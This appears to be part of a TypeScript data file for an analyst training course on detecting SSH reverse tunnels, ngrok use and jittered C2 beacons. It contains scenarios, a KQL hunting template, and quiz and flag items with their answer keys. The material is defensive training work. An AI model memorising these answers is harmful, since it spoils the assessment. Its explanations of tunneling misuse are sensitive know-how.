        `If the connection is HTTPS, what does the SNI reveal (a known tunneling-SaaS domain like *.ngrok.io, an unfamiliar/self-signed-certificate destination)? What's the JA3/JA3S? Were there DNS queries immediately preceding this connection that themselves showed tunneling-statistical anomalies (high entropy, TXT-heavy, high query rate) — sometimes the C2 channel itself IS the DNS traffic, rather than a separate follow-on TCP/TLS connection.\n\n` +
        `**Step 5 — Correlate with everything else happening on that host and account**\n\n` +
        `Does this coincide with other suspicious activity — a recent phishing click, an unusual authentication event, a process that shouldn't be there, files recently dropped into an unusual directory (like Temp, as seen with plink.exe in this room's log analysis)? A single, isolated finding is weaker evidence than the same finding appearing alongside two or three other unrelated-looking anomalies on the same host in the same time window.\n\n` +
        `**Step 6 — Check for a legitimate explanation BEFORE escalating: verify with the asset/change owner**\n\n` +
        `Given how genuinely dual-use every technique and tool in this room is — legitimate SSH tunneling for IT support, legitimate ngrok use by developers, legitimate Chisel use by an approved penetration test, legitimate plink.exe scripting by sysadmins — the final, essential step before treating any of these findings as confirmed malicious is checking for a documented, verifiable business explanation: an open change ticket, a known approved tool deployment, confirmation from the account owner or their manager, or a scheduled penetration test's rules of engagement. This is the industry practice of verifying with the asset or change owner (in this platform, the outcome is recorded as it_verify_result): "confirmed" means a legitimate explanation exists and this is very likely a false positive; "unverified" (or no ticket found at all) means the finding should be escalated and investigated as a real possibility, not dismissed. Skipping this step in either direction — either escalating every instance of a dual-use tool reflexively, or dismissing every instance because "that tool is sometimes used legitimately" — is exactly the failure mode this entire room has been building you toward avoiding.`,
      codeExample:
        "THE SIX-STEP TUNNELING INVESTIGATION SEQUENCE\n" +
        "=======================================================\n" +
        "1. Process ancestry + full command line (if available)\n" +
        "   -- reveals -L/-R/-D, the tool, and its exact args\n" +
        "2. Destination reputation + rarity\n" +
        "   -- first-seen? by how many hosts, how often?\n" +
        "3. Connection duration + byte pattern\n" +
        "   -- short/transactional, long-lived interactive, or\n" +
        "      beacon-shaped (small, consistent, repeating)?\n" +
        "4. DNS + TLS metadata\n" +
        "   -- SNI, JA3/JA3S, preceding DNS anomalies\n" +
        "5. Correlate with other activity on the same host/account\n" +
        "   -- phishing click, odd auth event, dropped file, etc.\n" +
        "6. Check for a documented, legitimate explanation\n" +
        "   -- it_verify_result: confirmed -> likely FP\n" +
        "   -- it_verify_result: unverified/none found -> escalate\n" +
        "=======================================================",
      checkpoint: {
        question:
          "According to the reading's six-step investigation playbook, what does an it_verify_result of 'confirmed' indicate?",
        options: [
          "it_verify_result records which analyst reviewed the alert, and says nothing about the activity itself",
          "A legitimate, documented business explanation exists for the activity, making it very likely a false positive",
          "An incident responder has finished forensic analysis of the tool's binary and proved malicious intent",
          "The host has been confirmed compromised, so the playbook's next step is to isolate it from the network",
        ],
        answer: 1,
        explanation:
          "it_verify_result 'confirmed' means the asset or change owner confirmed a documented business explanation (a change ticket, an approved tool deployment, account-owner confirmation), making the finding very likely a false positive. It is not a reviewer-tracking field, and it is not the output of malware forensics. It also points the opposite way from confirmed compromise: 'confirmed' supports closing, while 'unverified' is what drives escalation and containment.",
      },
    },

    // ── Question 1 ────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "tunnel-q1",
      question:
        "An internal server initiates an outbound SSH connection to an external host using the -R flag with arguments forwarding its own local port 3389. What does this specific flag and direction indicate, and why is it considered more dangerous than a -L forward?",
      options: [
        "-R is a dynamic SOCKS proxy that lets the internal server reach out through the external host, no riskier than -L",
        "-R opens a listener on the external host that leads back to this server's port 3389: inbound reach over an outbound link",
        "-R forwards the external host's own local port into the internal network, so it only matters if the server listens",
        "-R tunnels only port 3389 outbound in a restricted relay mode; the danger is data leaving, not access coming in",
      ],
      answer: 1,
      explanation:
        "As covered in Reading 1, -R creates a listener on the remote/external side that tunnels back to a local service on the machine that initiated the connection — so an external party reaches INTO the internal network through a tunnel that was only ever an OUTBOUND connection, sidestepping inbound firewall rules. -L, by contrast, only lets the initiating machine reach OUT through the remote side. The SOCKS-proxy option describes -D, not -R. The option claiming the external host's own port is forwarded inward reverses which side's service is exposed. The 'restricted relay, data leaving' option misses the point: the forwarded service is reached from outside, so the risk is inbound access, not just outbound data.",
      xp: 25,
    },

    // ── Question 2 ────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "tunnel-q2",
      question:
        "A C2 beacon is configured with a 90-second interval and 30% jitter, applied symmetrically (± around the base). Which observed inter-arrival delta falls OUTSIDE the expected jittered band, and therefore does not fit this beacon profile on its own?",
      options: [
        "66 seconds",
        "114 seconds",
        "60 seconds",
        "88 seconds",
      ],
      answer: 2,
      explanation:
        "With a 90-second interval and symmetric 30% jitter, the band runs from 90 minus 27 (63 seconds) to 90 plus 27 (117 seconds). 66 and 114 seconds sit near the edges but inside the band, and 88 seconds is close to the base, so all three fit. 60 seconds is just below the 63-second floor — reading 30% as ±30 seconds (a 60–120 band) would wrongly accept it. A gap outside the band means either it came from a different cause or the beacon's real configuration differs from what is assumed.",
      xp: 30,
    },

    // ── Question 3 ────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "tunnel-q3",
      question:
        "A production database server, which has never previously made outbound connections to any consumer SaaS platform, is observed making a TLS connection with SNI 'x7f2a9.ngrok-free.app'. Why is ngrok's own infrastructure being legitimate SaaS not enough to clear this finding on its own?",
      options: [
        "It can be cleared: the session is TLS to a reputable provider, so its contents are protected and pose no exfiltration risk",
        "Provider reputation is not the question; what matters is whether this host has any business need for a developer tunnel",
        "It can be cleared once the IP resolves to a cloud provider, since shared cloud IPs cannot be attributed to an attacker",
        "It stays open only until the SNI is checked against threat intel; a blocklist hit, not the host's role, should decide it",
      ],
      answer: 1,
      explanation:
        "As Reading 5 emphasizes, the tool's own legitimacy doesn't resolve the investigation — what matters is whether THIS HOST has any business reason to use it, and a production database server has none for a developer tunneling service. TLS protects the data from eavesdroppers, not from the attacker at the other end of the tunnel, so encryption is no reason to clear it. Shared cloud IPs make IP reputation weak, which is a reason to rely on context, not to close the alert. A random ngrok subdomain is fresh, legitimate infrastructure that a blocklist is unlikely to list, so a blocklist miss would wrongly clear a server that should never be using a tunnel at all.",
      xp: 25,
    },

    // ── Log Analysis 1: plink.exe reverse tunnel ─────────────────────────────
    {
      type: "log_analysis" as const,
      id: "tunnel-la1",
      heading: "Investigating an Unfamiliar SSH Client Launch on a Production Server",
      context:
        "SRV-APP12 is a production application server whose standard software inventory does not include any SSH client tooling. Review the Sysmon process-creation event (Event ID 1) below. SIEM enrichment gathered alongside it: (1) the 90-day process history shows no earlier execution of plink.exe on this host; (2) the firewall flow log shows the TCP session from SRV-APP12 to the destination in the command line still open 15,240 seconds (just over 4 hours) after this event; (3) the EDR's image-load record for the same binary reports its Authenticode signature as valid, signer Simon Tatham (the real PuTTY author).",
      event: plinkReverseTunnelEvent,
      questions: [
        {
          question:
            "Read the CommandLine field. What do its -R and -P arguments, taken together, set up?",
          options: [
            "SRV-APP12 gains RDP access to the remote host's port 3389, with SSH moved to a web port so it looks like HTTPS",
            "A listener on the remote host relays back to SRV-APP12's own RDP port, with SSH moved off port 22 via -P",
            "SRV-APP12 listens locally on 3389 and forwards to the remote host, while -P wraps the SSH session in TLS",
            "A SOCKS proxy on the remote host reaches any internal port, and -P sets the port the remote listener opens",
          ],
          answer: 1,
          explanation:
            "As covered in Reading 1, -R creates a listener on the REMOTE side that tunnels back to a local service — here SRV-APP12's own RDP port (127.0.0.1:3389) is exposed to whoever controls the remote SSH server. -P sets which port plink connects to on the SSH server, so the SSH session itself runs on the port given after -P instead of 22 — here a port normally used for HTTPS, so it blends in at a glance. The option giving SRV-APP12 RDP access to the remote host reverses the direction. A local listener forwarding outward is -L behaviour, and -P only changes the port — the traffic is still SSH, not TLS. A SOCKS proxy to any port is -D, and the remote listener's port is the first number in the -R specification, not the -P value.",
          xp: 25,
        },
        {
          question:
            "The SIEM enrichment says this is plink.exe's first execution on SRV-APP12 in 90 days, and the session is still open after just over 4 hours. Why do these two facts together matter more than either alone?",
          options: [
            "A first run only proves a new tool; it is the 4-hour duration alone that marks this as a tunnel rather than admin work",
            "A tool never seen on this host holding one session open for hours fits a maintained tunnel, not a one-off admin task",
            "A first execution means the binary was just dropped, which already confirms compromise; duration only sets severity",
            "Sessions this long usually mean a stuck transfer that never closed, so the first-run fact is what carries the signal",
          ],
          answer: 1,
          explanation:
            "Each fact alone has innocent explanations: a brand-new but legitimate admin tool, or a long session for a long-running legitimate task. Together — a tool with no history on this host holding a port-forwarding session open for hours — they fit a tunnel deliberately kept alive far better than a one-time administrative action. Treating duration alone as decisive ignores that admins also hold long SSH sessions; treating first execution alone as proof of compromise ignores legitimate new deployments (Reading 6 still requires the verification step). The stuck-transfer reading does not fit either: the command line sets up a port forward, not a file transfer.",
          xp: 25,
        },
        {
          question:
            "The EDR image-load record reports plink.exe's signature as valid, signed by Simon Tatham, the real PuTTY author. How should that change your assessment of this event?",
          options: [
            "Lower it: a valid signature from the real author rules out a trojanized binary, which was the main risk in this event",
            "Barely: it proves the binary is genuine PuTTY, not that this account, path and -R tunnel are authorized on this host",
            "Raise it: attackers favour stolen signing certificates, so a valid signature on a Temp-folder binary suggests theft",
            "Close it: signed admin tools started by a service account are normally pre-approved, so this is routine IT activity",
          ],
          answer: 1,
          explanation:
            "As Reading 5 explains, plink.exe's genuine signature is exactly why attackers favour it and why EDR/allowlisting often trusts it — the signature validates the binary, not this execution. The risk here was never a trojanized plink: a genuine copy does the -R forward just as well, so ruling out tampering does not lower severity. Nothing in the evidence points to a stolen certificate — the signer is the real author — so treating the signature as a theft indicator misreads it. And signing says nothing about approval: SRV-APP12's inventory has no SSH tooling, the binary ran from a Temp folder, and it has no history on the host, so it cannot be closed as routine.",
          xp: 30,
        },
      ],
    },

    // ── Log Analysis 2: ngrok beacon investigation ───────────────────────────
    {
      type: "log_analysis" as const,
      id: "tunnel-la2",
      heading: "Investigating Repeated TLS Sessions From a Database Server to a Tunneling Domain",
      context:
        "SRV-DB07 hosts the company's production SQL Server instance and, per its documented network policy, should only ever communicate with the application tier and backup infrastructure. The event below is a SIEM aggregate built from the last hour of Zscaler Internet Access proxy logs for this host and destination (connection count, interval and byte statistics). The proxy cannot see processes, so the SIEM joined it with the EDR's network-connection telemetry for SRV-DB07 — that join is where process_hint comes from.",
      event: ngrokBeaconEvent,
      questions: [
        {
          question:
            "Using the interval and connection-count fields in the raw event and the beaconing math from Reading 4, what does this timing pattern indicate?",
          options: [
            "Nothing yet: without the configured jitter percentage, clustering cannot be judged from the observed gaps alone",
            "Gaps cluster tightly around ~60 s for a full hour, a bounded band that fits a jittered beacon, not human traffic",
            "A beacon is unlikely: jitter exists to make gaps irregular, and gaps this consistent point to a scheduled task",
            "A beacon is unlikely: a real beacon's gaps would vary by under a second, and these vary by almost 7 seconds",
          ],
          answer: 1,
          explanation:
            "58 connections in an hour with an average gap of 61.2 s and a standard deviation of only 6.8 s means the gaps sit in a tight band around ~60 s — the clustered-delta signature from Reading 4. The configured jitter percentage does not need to be known in advance; the observed spread itself shows the gaps are bounded rather than scattered. Jitter does not make gaps irregular in the human sense — it only randomizes within a band, so consistent-but-not-identical gaps are exactly what a jittered beacon looks like (a scheduled task remains a possible benign explanation, but it is settled by destination and process context, not by the timing). Expecting sub-second variation describes an un-jittered beacon and ignores the configured jitter that produces a few seconds of spread.",
          xp: 25,
        },
        {
          question:
            "process_hint (from the EDR join) attributes these sessions to sqlservr.exe, the SQL Server database engine. How does that attribution change the severity?",
          options: [
            "No change: the proxy cannot see processes, so the attribution is a guess and any process on SRV-DB07 is equally likely",
            "It raises it: the database engine itself is beaconing to a tunnel service, so code is running inside or through SQL Server",
            "It lowers it: SQL Server routinely makes outbound HTTPS calls for licensing and telemetry, so this traffic is expected",
            "It narrows scope only: an admin's ngrok client is likely relaying to SQL Server, and sqlservr.exe is the relayed session",
          ],
          answer: 1,
          explanation:
            "The beacon is attributed to the core database engine, not an unrelated utility — that points to code executing inside or through SQL Server (for example via SQL injection leading to command execution, or a malicious extended stored procedure), far more severe than a monitoring agent making the same connection. The attribution is not a guess: the context says it comes from the EDR join, not from the proxy, which indeed cannot see processes. Routine licensing or telemetry calls would not go to a random ngrok tunnel domain, and the host's documented policy allows only the app tier and backups. If an admin's ngrok client were relaying to SQL Server, the outbound sessions to ngrok would belong to ngrok.exe, not to sqlservr.exe.",
          xp: 30,
        },
        {
          question:
            "What is the correct, prioritized response given the combination of beacon-shaped timing, an ngrok tunneling domain, and sqlservr.exe as the source process?",
          options: [
            "Block the ngrok domain at the proxy and close the alert; once the channel is cut, the database is no longer exposed",
            "Isolate SRV-DB07 with evidence preserved, block the ngrok destination, and examine SQL Server for how code got executed",
            "Restart the SQL Server service to kill the beacon, then watch the proxy for a reconnection attempt before escalating",
            "Reimage SRV-DB07 from the last clean backup at once to remove the implant, then block the ngrok domain at the proxy",
          ],
          answer: 1,
          explanation:
            "A production database engine beaconing to a tunneling service with no business justification is an active compromise: contain it by isolating the host while preserving forensic evidence, block the tunnel destination, investigate how code ran inside SQL Server (extended stored procedures, unusual child processes, injection in query logs), and treat the data as potentially exposed. Blocking the domain alone leaves the foothold in place — the attacker can switch to another ngrok subdomain or channel — so closing the alert is premature. Restarting the service destroys in-memory evidence and delays escalation of a confirmed beacon. Reimaging right away also wipes the evidence needed to learn how the engine was compromised and what data was touched, so the same hole may be reopened.",
          xp: 30,
        },
      ],
    },

    // ── Analyst Choice: approved pentest / verified dev use FP trap ──────────
    {
      type: "analyst_choice" as const,
      id: "tunnel-ac1",
      heading: "Verdict: An Engineer's Laptop Using ngrok During a Sprint Demo",
      scenario:
        "A detection rule flagged WKS-DEV27, a software engineer's laptop, for establishing TLS sessions with SNI matching *.ngrok-free.app during business hours — the same tunneling service seen in the SRV-DB07 investigation. Before deciding, review the proxy event (session count, duration and the process behind it) and the context you gathered from IT and the change calendar, shown under the log.",
      event: {
        id: "evt-tunnel-ac1-001",
        ts: "2026-07-02T14:30:00.000Z",
        source: "proxy",
        vendor: "Zscaler Internet Access",
        event_type: "net_connection",
        severity: "low",
        hostname: "WKS-DEV27.solvix.local",
        src_ip: "10.40.6.155",
        dst_ip: "18.223.101.4",
        dst_port: 443,
        protocol: "tcp",
        network: { domain: "c4a91f.ngrok-free.app" },
        it_verify_result: "confirmed",
        it_verify_message: "Standing exception on file since 2026-01: developer approved for ngrok use for stakeholder demos. Calendar shows a sprint demo at this exact time.",
        description:
          "WKS-DEV27 established a TLS session with SNI c4a91f.ngrok-free.app during a scheduled sprint demo meeting; connection duration matches the meeting's scheduled length",
        raw: {
          "tls.sni": "c4a91f.ngrok-free.app",
          "destination.ip": "18.223.101.4",
          "destination.port": 443,
          "network.protocol": "https",
          connections_last_hour: 1,
          session_duration_seconds: 2640,
          process_hint: "ngrok.exe",
        },
      },
      correct_verdict: "false_positive",
      explanation:
        "The ngrok SNI is the same as in Log Analysis 2, but the surrounding evidence differs on every axis that matters: the process is ngrok.exe (the developer's own tunneling client) on a developer laptop, not sqlservr.exe on a production database server; and it_verify_result confirms a standing, documented, six-month-old exception specifically authorizing this exact behavior for this exact user, the timing precisely matches a scheduled calendar event (a sprint demo, the documented legitimate use case), the connection count is a single session (not dozens of repeating beacon-shaped connections), and the duration (44 minutes) matches a plausible meeting length rather than an indefinitely-sustained tunnel. This is exactly the dual-use, legitimate case Reading 5 described.",
      fp_trap:
        "After Log Analysis 2's finding that an ngrok connection from a database server was a serious active compromise, it's tempting to treat ANY ngrok traffic as inherently high-severity from now on. But the room was explicit throughout: the tool's presence alone is never sufficient, context is everything. Here, unlike the database server case, there IS a documented business justification, an authorized user with a standing exception, a single (not repeating/beacon-shaped) session, and calendar corroboration — none of which existed in the malicious example. Escalating this identically to the database server finding, purely because both involve the string 'ngrok', would ignore every contextual differentiator this room has spent six readings teaching you to weigh.",
      xp: 30,
    },

    // ── Matching: tunneling technique <-> mechanism ─────────────────────────
    {
      type: "matching" as const,
      id: "tunnel-m1",
      heading: "Match Each Tunneling Technique or Tool to Its Core Mechanism",
      instructions: "Match each technique/tool to how it actually works at the protocol/mechanism level.",
      pairs: [
        { id: "sshL", left: "SSH -L (local forward)", right: "Opens a listener on the initiating machine that tunnels OUT to a service reachable from the remote side" },
        { id: "sshR", left: "SSH -R (remote forward)", right: "Opens a listener on the REMOTE side that tunnels back IN to a service on the initiating machine — the dangerous, firewall-bypassing direction" },
        { id: "sshD", left: "SSH -D (dynamic forward)", right: "Turns the local machine into a full SOCKS proxy, allowing any application to reach any destination reachable from the remote side" },
        { id: "icmp", left: "ICMP tunneling", right: "Encodes arbitrary command/data payload inside ICMP echo request/reply packets, abusing the unused padding field ping normally sends" },
        { id: "ngrokmech", left: "ngrok", right: "Creates a public tunnel to a local service entirely through ngrok's own cloud infrastructure, requiring no inbound firewall changes or public IP on the target end" },
        { id: "chisel", left: "Chisel", right: "A single-file, dependency-free binary that tunnels TCP/UDP over HTTP, frequently paired with SOCKS proxy functionality for pivoting" },
      ],
      explanation:
        "Each technique moves data through a different mechanism, but they share a common theme: all of them ride on protocols or infrastructure that is either encrypted, widely trusted, or both, specifically to blend in with legitimate traffic. Recognizing the exact mechanism — which direction a listener opens, what protocol carries the payload, what infrastructure is involved — is what lets an analyst predict exactly which log source and which specific field will contain the evidence.",
      xp: 40,
    },

    // ── Ordering: beacon detection workflow ──────────────────────────────────
    {
      type: "ordering" as const,
      id: "tunnel-o1",
      heading: "Order the Beacon Detection Workflow",
      instructions: "You are running a beacon hunt that starts from proxy logs only — no endpoint alert exists yet, so you do not know which host or process to look at. Each step below consumes the output of the step before it. Arrange them in that dependency order.",
      items: [
        { id: "collect", text: "Pull every proxy-log connection timestamp for each host/destination pair over a multi-hour window" },
        { id: "deltas", text: "Turn each pair's timestamp list into inter-arrival deltas (the gap between successive connections)" },
        { id: "band", text: "From those deltas, compute mean and standard deviation to test for a tight, bounded cluster" },
        { id: "bytes", text: "Combine the clustering result with repetition count and bytes-per-connection consistency into a beacon score" },
        { id: "rarity", text: "Keep only the high-scoring pairs whose destination is rare across the environment, dropping widely used services" },
        { id: "ancestry", text: "On each host that survives that filter, pivot to endpoint telemetry to find the owning process and its command line" },
        { id: "verdict", text: "With the owning process identified, check for a documented legitimate explanation, then close or escalate" },
      ],
      correct_order: ["collect", "deltas", "band", "bytes", "rarity", "ancestry", "verdict"],
      explanation:
        "Each step needs the previous step's output: timestamps must exist before deltas can be computed; deltas before their mean and spread; the clustering result before it can be scored together with repetition and byte consistency; scores before the high-scoring pairs can be filtered by destination rarity (which removes busy update/telemetry services that also look regular); the surviving hosts before you know where to pull endpoint process context; and the owning process before you can ask its owner for a legitimate explanation and decide. Reading 6 puts process ancestry first when an endpoint alert already names the process — in a hunt that starts from network data alone, you only reach the endpoint once the timing math has told you which host to look at.",
      xp: 35,
    },

    // ── Query Fill: KQL to surface beacon-shaped connections by interval ────
    {
      type: "query_fill" as const,
      id: "tunnel-qf1",
      heading: "Write It Yourself: Surface Beacon-Shaped Connections in KQL",
      language: "kql",
      context:
        "Turn the pattern from Log Analysis 2 into a one-hour hunt over Defender for Endpoint network events. The rows are sorted per device and destination so prev() can compute each gap, and the first row of every pair gets a null gap. Requirements: (1) HTTPS only; (2) measure the SPREAD of the gaps, not their average — Reading 4's signal is tight clustering; (3) the count threshold must ignore pairs with fewer than 10 connections in the hour, yet still keep a beacon that sleeps at most 120 seconds (about 30 connections per hour); (4) the spread threshold, a whole number of seconds, must keep Log Analysis 2's beacon (standard deviation 6.8 s) while dropping human browsing, whose gaps typically vary with a standard deviation of 30 s or more.",
      template:
        "DeviceNetworkEvents\n| where Timestamp > ago(1h)\n| where RemotePort == {{port}}\n| sort by DeviceName asc, RemoteUrl asc, Timestamp asc\n| extend Delta = iff(DeviceName == prev(DeviceName) and RemoteUrl == prev(RemoteUrl), datetime_diff('second', Timestamp, prev(Timestamp)), long(null))\n| summarize ConnectionCount = count(), AvgDelta = avg(Delta), StdDelta = {{agg}}(Delta) by DeviceName, RemoteUrl\n| where ConnectionCount > {{threshold}} and StdDelta < {{maxstd}}",
      blanks: [
        { id: "port", answers: ["443"], placeholder: "standard HTTPS port" },
        { id: "agg", answers: ["stdev", "stdevp"], placeholder: "KQL aggregation that measures the spread of the gaps" },
        { id: "threshold", answers: ["9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29"], placeholder: "connection-count threshold (see requirement 3)" },
        { id: "maxstd", answers: ["7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30"], placeholder: "maximum standard deviation in whole seconds (see requirement 4)" },
      ],
      explanation:
        "RemotePort == 443 limits the hunt to HTTPS. Sorting by device, destination and time serializes the rows so prev() works, and the iff() stops a gap from being computed across two different device/destination pairs. stdev (or the population variant stdevp) measures how tightly the gaps cluster — the beacon signal from Reading 4 — whereas an average alone cannot tell a tight 60 s beacon from human traffic that happens to average 60 s. For the count, ConnectionCount > N drops pairs with 9 or fewer connections only if N is at least 9, and keeps a 30-connection beacon only if N is at most 29, so any value from 9 to 29 is correct. For the spread, StdDelta < X keeps Log Analysis 2 (6.8 s) only if X is at least 7, and drops a standard deviation of 30 s only if X is at most 30, so any whole number from 7 to 30 is correct.",
      xp: 35,
    },

    // ── Flag ──────────────────────────────────────────────────────────────
    {
      type: "flag" as const,
      id: "tunnel-f1",
      prompt:
        "Go back to Log Analysis 1, the plink.exe event on SRV-APP12. The egress firewall only ever sees the outer SSH connection that carries the tunnel. Which destination TCP port will the firewall record for that connection? Enter the number only.",
      answer: "443",
      hint: "In plink's command line, the ports inside the forwarding specification are not the port of the SSH server itself — a separate flag sets that.",
      xp: 25,
    },
  ],
};

export default [tunnelingRoom];
